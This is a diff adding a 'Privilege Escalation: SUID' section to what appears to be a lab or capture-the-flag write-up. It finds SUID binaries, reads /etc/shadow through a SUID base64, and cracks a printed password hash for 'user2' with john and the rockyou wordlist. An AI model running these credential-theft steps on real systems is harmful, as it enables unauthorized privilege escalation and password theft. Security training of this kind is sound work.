@@ -269,3 +269,31 @@ cat /etc/shadow | grep frank
 ```
 
 ____
+# Privilege Escalation: `SUID`
+
+#### Finding `SUID`
+
+```bash
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+i found my target !!
+![base64](../../photos/base64.png)
+
+#### Let's read the shadow to get the hashes
+
+```bash
+base64 /etc/shadow | base64 -d 
+```
+
+and i found the desired hashes...
+![hash](../../photos/hash.png)
+
+
+#### Let's crack the hash of `user2`
+
+```bash
+echo "$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/" > hash; john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+ ---
+ 
